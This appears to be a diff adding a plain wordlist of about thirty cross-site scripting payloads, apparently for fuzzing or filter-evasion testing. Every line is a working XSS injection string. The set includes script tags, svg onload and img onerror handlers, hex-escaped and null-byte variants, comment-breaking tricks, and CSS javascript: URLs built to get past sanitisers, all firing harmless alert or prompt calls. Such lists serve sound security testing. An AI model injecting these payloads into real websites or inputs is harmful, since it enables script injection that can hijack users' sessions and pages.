@@ -1,0 +1,30 @@
+<script>alert(1)</script>
+<SCript>alert(1)</scrIPT>
+<script>confirm(1)</script>
+<svg onload=confirm(1)>
+<script>alert(1)</script>
+<image/src/onerror=prompt(8)>
+<img/src/onerror=prompt(8)>
+<image src/onerror=prompt(8)>
+<img src/onerror=prompt(8)>
+<image src =q onerror=prompt(8)>
+<img src =q onerror=prompt(8)>
+</scrip</script>t><img src =q onerror=prompt(8)>
+'`"><\x3Cscript>javascript:alert(1)</script>        
+'`"><\x00script>javascript:alert(1)</script>
+<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
+\x3Cscript>javascript:alert(1)</script>
+'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
+<script>javascript:alert(1)</script\x0D
+<script>javascript:alert(1)</script\x0A
+<script>javascript:alert(1)</script\x0B
+<script charset="\x22>javascript:alert(1)</script>
+<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+\&quot;;alert(&apos;XSS&apos;);//
+&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
+<;BODY ONLOAD=alert(';XSS';)>;
+<;DIV STYLE=";background-image: url(javascript:alert(';XSS';))";>;
+<;DIV STYLE=";background-image: url(&;#1;javascript:alert(';XSS';))";>;
+<img src=xss onerror=alert(1)>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
